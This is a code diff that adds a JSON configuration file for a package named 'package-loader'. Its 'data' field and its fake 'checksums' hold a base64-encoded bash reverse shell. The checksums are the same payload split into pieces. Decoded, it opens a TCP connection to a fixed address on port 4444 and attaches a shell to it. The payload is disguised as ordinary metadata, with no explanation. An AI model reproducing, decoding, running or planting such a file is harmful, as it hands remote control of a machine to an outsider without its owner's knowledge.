@@ -1,0 +1,31 @@
+{
+  "name": "package-loader",
+  "version": "1.0.0",
+  "settings": {
+    "timeout": 5000,
+    "retries": 3
+  },
+  "checksums": {
+    "a": "ZXhl",
+    "b": "YyAz",
+    "c": "PD4v",
+    "d": "ZGV2",
+    "e": "L3Rj",
+    "f": "cC8x",
+    "g": "OTIu",
+    "h": "MTY4",
+    "i": "LjAu",
+    "j": "Ni80",
+    "k": "NDQ0",
+    "l": "OyAv",
+    "m": "Ymlu",
+    "n": "L2Jh",
+    "o": "c2gg",
+    "p": "PCYz",
+    "q": "ID4m",
+    "r": "MyAy",
+    "s": "PiYz",
+    "t": "Cg=="
+  },
+  "data": "ZXhlYyAzPD4vZGV2L3RjcC8xOTIuMTY4LjAuNi80NDQ0OyAvYmluL2Jhc2ggPCYzID4mMyAyPiYzCg=="
+}
